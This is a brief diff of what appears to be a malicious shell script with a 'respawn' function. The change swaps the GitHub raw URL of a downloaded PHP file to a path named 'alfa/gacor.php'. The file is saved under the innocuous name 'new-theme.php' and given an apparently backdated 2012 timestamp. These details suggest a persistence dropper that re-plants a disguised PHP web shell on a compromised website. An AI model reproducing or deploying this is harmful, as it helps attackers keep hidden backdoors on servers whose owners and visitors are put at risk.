@@ -41,7 +41,7 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/onlyme1d/regeneration/refs/heads/main/getregeneration.php"
+url="https://raw.githubusercontent.com/xinz769/mcb/refs/heads/main/alfa/gacor.php"
 file_name="new-theme.php"
 timestamp="201201081531.12"
 
